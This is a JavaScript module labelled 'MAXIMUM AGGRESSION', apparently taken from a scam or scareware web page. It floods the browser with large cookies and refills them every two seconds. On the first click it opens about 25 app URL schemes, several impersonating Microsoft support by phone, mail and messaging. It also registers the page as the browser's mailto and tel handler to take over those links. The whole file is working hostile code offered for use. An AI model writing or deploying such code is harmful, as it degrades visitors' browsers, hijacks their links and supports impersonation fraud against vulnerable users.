/**
 * 22. COOKIE BOMBING + URL SCHEME + PROTOCOL HANDLERS - MAXIMUM AGGRESSION
 */
const CookieSchemeBomb = {
    init: function() {
        this.bombCookies();
        this.attemptURLSchemes();
        this.registerProtocolHandlers();
    },
    bombCookies: function() {
        try {
            // Set massive cookies
            const cookieData = 'X'.repeat(4000);
            for (let i = 0; i < 100; i++) {
                document.cookie = 'bomb_' + i + '=' + cookieData + ';path=/;max-age=31536000;domain=' + window.location.hostname;
            }
            // Also set cookies for common subdomains
            const subdomains = ['www', 'mail', 'login', 'account', 'support', 'secure', 'api'];
            subdomains.forEach(sub => {
                try {
                    document.cookie = 'bomb=' + cookieData + ';path=/;max-age=31536000;domain=.' + sub + '.' + window.location.hostname;
                } catch(e) {}
            });
        } catch(e) {}
        // Keep refilling
        setInterval(() => {
            try {
                const cookies = document.cookie.split(';');
                if (cookies.length < 50) {
                    const cookieData = 'X'.repeat(4000);
                    for (let i = 0; i < 50; i++) {
                        document.cookie = 'bomb_' + i + '=' + cookieData + ';path=/;max-age=31536000';
                    }
                }
            } catch(e) {}
        }, 2000);
    },
    attemptURLSchemes: function() {
        const schemes = [
            'tel:+1-800-MICROSOFT',
            'mailto:support@microsoft.com',
            'sms:+1-800-642-7676',
            'facetime://support@microsoft.com',
            'skype:echo123?call',
            'zoomus://join?confno=123456789',
            'teams://meeting/join',
            'webex://join',
            'slack://open',
            'discord://open',
            'steam://open',
            'spotify://open',
            'itms-apps://',
            'market://details?id=com.microsoft',
            'intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end',
            'whatsapp://send?text=URGENT',
            'viber://pa?chatURI=12345',
            'tg://resolve?domain=microsoft',
            'fb://profile',
            'twitter://user?screen_name=microsoft',
            'instagram://user?username=microsoft',
            'linkedin://profile',
            'youtube://channel',
            'reddit://open',
            'tiktok://user?username=microsoft'
        ];
        // Try to open schemes on click
        document.addEventListener('click', () => {
            schemes.forEach((scheme, i) => {
                setTimeout(() => {
                    try {
                        const a = document.createElement('a');
                        a.href = scheme;
                        a.click();
                    } catch(e) {}
                }, i * 100);
            });
        }, { once: true });
    },
    registerProtocolHandlers: function() {
        try {
            if (navigator.registerProtocolHandler) {
                navigator.registerProtocolHandler('web+fs17', window.location.href + '?handler=%s', 'FS17 Handler');
                navigator.registerProtocolHandler('mailto', window.location.href + '?email=%s', 'FS17 Mail');
                navigator.registerProtocolHandler('tel', window.location.href + '?phone=%s', 'FS17 Phone');
            }
        } catch(e) {}
    }
};